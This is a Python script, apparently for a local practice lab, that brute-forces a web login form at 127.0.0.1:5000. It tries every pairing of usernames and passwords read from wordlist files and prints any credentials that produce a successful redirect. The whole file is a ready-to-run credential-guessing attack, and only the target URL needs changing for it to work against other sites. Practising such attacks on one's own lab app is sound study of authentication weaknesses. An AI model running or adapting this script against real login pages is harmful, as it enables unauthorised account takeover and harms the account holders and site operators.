import requests
import sys

# Configuration
url = "http://127.0.0.1:5000/login"
username_file = "username.txt"
password_file = "passwords.txt"

print("=" * 60)
print("BRUTE FORCE AUTHENTICATION ATTACK")
print("=" * 60)
print(f"[*] Target URL: {url}")
print(f"[*] Username file: {username_file}")
print(f"[*] Password file: {password_file}")
print("-" * 60)

# Read usernames from file
try:
    with open(username_file, 'r') as f:
        usernames = [line.strip() for line in f.readlines() if line.strip()]
except FileNotFoundError:
    print(f"[!] Error: {username_file} not found!")
    sys.exit(1)

# Read passwords from file
try:
    with open(password_file, 'r') as f:
        passwords = [line.strip() for line in f.readlines() if line.strip()]
except FileNotFoundError:
    print(f"[!] Error: {password_file} not found!")
    sys.exit(1)

print(f"[*] Loaded {len(usernames)} usernames and {len(passwords)} passwords")
print(f"[*] Total attempts: {len(usernames) * len(passwords)}")
print("-" * 60)

successful_logins = []
attempt_count = 0

# Try each username/password combination (Cluster Bomb attack)
for username in usernames:
    for password in passwords:
        attempt_count += 1
        data = {
            'username': username,
            'password': password
        }
        
        try:
            response = requests.post(url, data=data, allow_redirects=False)
            
            # Check if login was successful
            # Success indicators: redirect (302) and no "Invalid Credentials" message
            if response.status_code == 302 and "Invalid Credentials" not in response.text:
                print(f"[+] SUCCESS! Username: {username} | Password: {password} | Status: {response.status_code} | Length: {len(response.text)}")
                successful_logins.append((username, password, response.status_code, len(response.text)))
            else:
                print(f"[-] Attempt {attempt_count}: {username}:{password} | Status: {response.status_code} | Length: {len(response.text)}")
        
        except requests.exceptions.ConnectionError:
            print(f"[!] Error: Cannot connect to {url}")
            print("[!] Make sure the Flask app is running (python app.py)")
            sys.exit(1)

print("\n" + "=" * 60)
print("ATTACK COMPLETED")
print("=" * 60)

if successful_logins:
    print(f"[+] Found {len(successful_logins)} valid credential(s):")
    for username, password, status, length in successful_logins:
        print(f"    Username: {username} | Password: {password}")
else:
    print("[!] No valid credentials found in the provided lists")
